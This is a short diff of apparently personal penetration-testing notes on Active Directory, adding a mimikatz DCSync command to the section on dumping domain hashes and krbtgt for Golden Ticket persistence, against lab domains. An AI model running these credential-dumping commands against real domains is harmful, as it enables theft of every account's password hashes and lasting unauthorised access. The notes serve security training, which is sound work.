@@ -246,4 +246,6 @@ inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_ha
 - We could also target the krbtgt account and use this to create a Golden Ticket for persistence you can check here for more [ticket-abuse](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md#ticket-abuse)
 ```
 .\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
+.\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:painters.htb /user:painters.htb\krbtgt /all /csv"
+
 ```
